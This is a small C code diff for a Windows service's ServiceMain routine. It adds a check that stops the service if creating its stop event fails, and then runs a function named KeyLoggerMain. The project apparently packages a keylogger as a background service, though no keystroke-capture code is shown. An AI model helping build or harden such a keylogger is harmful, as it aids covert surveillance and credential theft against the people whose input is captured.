@@ -96,8 +96,14 @@ void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
 
     g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
-    status.dwCurrentState = SERVICE_RUNNING;
-    SetServiceStatus(g_ServiceStatusHandle, &status);
+    if(!g_ServiceStopEvent) {
+        status.dwCurrentState = SERVICE_STOPPED;
+        SetServiceStatus(g_ServiceStatusHandle, &status);
+        return;
+	}
+
+	status.dwCurrentState = SERVICE_RUNNING;
+	SetServiceStatus(g_ServiceStatusHandle, &status);
 
     KeyLoggerMain();
 
